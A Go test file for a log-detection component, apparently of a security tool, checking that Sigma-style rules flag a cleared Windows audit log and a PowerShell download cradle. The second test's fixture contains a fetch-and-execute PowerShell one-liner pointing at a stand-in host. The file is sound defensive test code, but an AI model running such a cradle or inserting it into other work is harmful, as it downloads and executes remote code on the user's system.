package detect

import (
	"testing"

	"github.com/FlinnZee/breachhound/internal/core"
)

func TestSigmaMatchesLogCleared(t *testing.T) {
	ctx := core.NewContext(core.Config{})
	ctx.Host.Events = []core.Event{
		{Channel: "Security", ID: 1102, Message: "The audit log was cleared."},
		{Channel: "System", ID: 7036, Message: "service entered running state"},
	}
	fs, err := sigmaDetector{}.Detect(ctx)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range fs {
		if f.Title == "Windows Security Audit Log Cleared" {
			found = true
			if f.Severity != core.SevHigh {
				t.Errorf("severity = %v, want HIGH", f.Severity)
			}
			if f.Technique != "T1070.001" {
				t.Errorf("technique = %q, want T1070.001", f.Technique)
			}
		}
	}
	if !found {
		t.Fatalf("log-cleared rule did not match; got %d findings", len(fs))
	}
}

func TestSigmaMatchesPowerShellCradle(t *testing.T) {
	ctx := core.NewContext(core.Config{})
	ctx.Host.Events = []core.Event{
		{Channel: "Microsoft-Windows-PowerShell/Operational", ID: 4104, Message: "scriptblock",
			Data: map[string]string{"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"}},
	}
	fs, _ := sigmaDetector{}.Detect(ctx)
	if len(fs) == 0 {
		t.Fatal("expected a PowerShell download-cradle match")
	}
}
